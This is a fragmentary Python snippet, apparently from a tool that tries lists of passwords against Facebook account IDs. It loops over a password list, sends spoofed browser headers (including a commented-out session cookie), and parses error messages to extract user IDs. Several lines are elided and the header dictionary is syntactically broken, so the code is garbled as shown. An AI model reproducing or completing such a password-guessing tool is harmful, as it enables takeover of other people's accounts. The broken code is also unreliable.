...
def rd(ids,passlist):
	try:
		...
		for pas in passlist:                                          
			...
			ua = 'authority': 'www.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en;q=0.9,fa-AF;q=0.8,fa;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=VMYfZ5d7Q_HVUAUXRu_GChph; sb=VMYfZ3vPRwLwGLrT2O-KRtdD; ps_l=1; ps_n=1; fr=0sLxp8Lwi1zet55EE..BnH8ZU..AAA.0.0.BnIRxC.AWWPVUY1CoM; wd=980x1853; dpr=1.875',
    'save-data': 'on',
    ...
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',   'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6542.95 Safari/537.36',}
				break
			elif 'www.facebook.com' in po['error']['message']:                                
				uid = str(po['error']['error_data']['uid'])
